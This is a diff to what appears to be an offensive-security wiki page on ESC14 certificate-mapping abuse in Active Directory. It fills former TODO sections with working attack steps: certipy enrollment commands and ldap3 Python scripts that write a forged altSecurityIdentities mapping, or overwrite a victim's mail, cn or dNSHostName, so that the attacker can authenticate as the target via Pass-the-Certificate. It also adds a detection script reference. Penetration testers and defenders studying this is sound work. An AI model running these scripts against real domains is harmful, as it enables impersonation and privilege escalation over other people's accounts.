@@ -655,11 +655,27 @@ It is also possible to view the necessary DACL in BloodHound.
 :::
 
 
-Detection of weak explicit mapping can be done with the [Get-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1) script (PowerShell) from a Windows machine. At the time of writing (May 16st, 2024), there is no solution to perform this check from a UNIX-like system.
+Detection of weak explicit mapping can be done like this :
+
+::: tabs
+
+=== UNIX-like
+
+From UNIX-like systems, with the [GetWeakExplicitMappings.py](https://github.com/3C4D/GetWeakExplicitMappings/blob/main/GetWeakExplicitMappings.py) script (Python).
+
+```bash
+python3 GetWeakExplicitMappings.py -dc-host $DC_HOST -u $USERNAME -p $PASSWORD -domain $DOMAIN
+```
+
+=== Windows
+
+From a Windows machine, with the [Get-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1) script (PowerShell).
 
 ```powershell
 Get-AltSecIDMapping -SearchBase "CN=Users,DC=domain,DC=local"
 ```
+
+:::
 
 #### (ESC14 A) Write access on altSecurityIdentities
 
@@ -682,8 +698,86 @@ For PKINIT authentication, no additional requirements are necessary. For Schanne
 
 === UNIX-like
 
-// TODO
+From UNIX-like systems, with [certipy](https://github.com/ly4k/Certipy), it is possible to enroll on a certificate template.
 
+```bash
+certipy req -u $TARGET@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+Then, using [certipy](https://github.com/ly4k/Certipy), we can get the certificate out of the pfx file.
+
+```bash
+certipy cert -pfx target.pfx -nokey -out "target.crt"
+```
+
+[openssl](https://github.com/openssl/openssl) can be used to extract the "Issuer" and the "Serial Number" value out of the certificate.
+
+```bash
+openssl x509 -in target.crt -noout -text
+```
+
+With the following python script (inspired from [this script](https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1)), we can use the previously dumped values to craft a X509IssuerSerialNumber mapping string.
+
+```python
+issuer = ",".join("<TARGET_DN>".split(",")[::-1])
+serial = "".join("<SERIAL_NUMBER>".split(":")[::-1])
+
+print("X509:<I>"+issuer+"<SR>"+serial)
+```
+
+the string can then be added to `altSecurityIdentities` target's attribute with the following python script.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "<TARGET_DN>"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'altSecurityIdentities':[(ldap3.MODIFY_ADD, '<X509IssuerSerialNumber>')]}
+)
+
+conn.unbind()
+```
+
+The certificate requested at the begining can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
+
+The certificate mapping written can be cleaned with the following python script.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "<TARGET_DN>"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'altSecurityIdentities':[(ldap3.MODIFY_DELETE, '<X509IssuerSerialNumber>')]}
+)
+
+conn.unbind()
+```
 
 === Windows
 
@@ -738,13 +832,45 @@ For this attack, a few additional prerequisites are necessary:
 > * The certificate template shows `CT_FLAG_NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag` and shows the attribute `CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` in `msPKI-Certificate-Name-Flag`
 > * For PKINIT, `StrongCertificateBindingEnforcement` is set to `0` or `1`
 > * For Schannel, `CertificateMappingMethods` indicates `0x8` and `StrongCertificateBindingEnforcement` is set to `0` or `1`
+:::
 
 ::: tabs
 
 === UNIX-like
 
-// TODO
+From UNIX-like systems, the `mail` attribute of the victim can be overwritten to match the `X509RFC822` mapping of the target using the following python script.
 
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "<VICTIM_DN>"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'mail':[(ldap3.MODIFY_REPLACE, '<TARGET_EMAIL>')]}
+)
+
+conn.unbind()
+```
+
+With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll on a certificate template using the victim credentials.
+
+```bash
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 === Windows
 
@@ -792,8 +918,39 @@ In this example, the target has the explicit mapping value `X509:<I>DC=local,DC=
 
 === UNIX-like
 
-// TODO
+From UNIX-like systems, the `cn` attribute of the victim can be overwritten with the following python script to be equal to `<TARGET>.<DOMAIN>`.
 
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "CN=<VICTIM>,CN=Computers,DC=domain,DC=local"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify_dn(
+        victim_dn,
+        'CN=<TARGET>.<DOMAIN>'
+)
+
+conn.unbind()
+```
+
+With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll on a certificate template using the victim credentials
+
+```bash
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 === Windows
 
@@ -840,12 +997,44 @@ In this example, the target has the explicit mapping value `X509:<S>CN=TARGET`. 
 
 === UNIX-like
 
-// TODO
+From UNIX-like systems, the `dNSHostName` attribute of the victim can be overwritten with the following python script to be equal to `<TARGET>`.
+
+```python
+import ldap3
+
+server = ldap3.Server('<DC_HOST>')
+victim_dn = "CN=<VICTIM>,CN=Computers,DC=domain,DC=local"
+attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
+attacker_password = "<ATTACKER_PASSWORD>"
+
+conn = ldap3.Connection(
+    server=server,
+    user=attacker_username,
+    password=attacker_password,
+    authentication=ldap3.NTLM
+)
+conn.bind()
+
+conn.modify(
+    victim_dn,
+    {'dNSHostName':[(ldap3.MODIFY_REPLACE, '<TARGET>')]}
+)
+
+conn.unbind()
+```
+
+With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll on a certificate template using the victim credentials
+
+```bash
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+```
+
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate as the target.
 
 
 === Windows
 
-From Windows systems, with PowerShell the `cn` attribute of the victim must be overwritten to be equal to `$TARGET.domain.local`.
+From Windows systems, with PowerShell the `dNSHostName` attribute of the victim must be overwritten to be equal to `$TARGET`.
 
 ```powershell
 $victim = [ADSI]"LDAP://CN=$VICTIM,CN=Computers,DC=domain,DC=local"
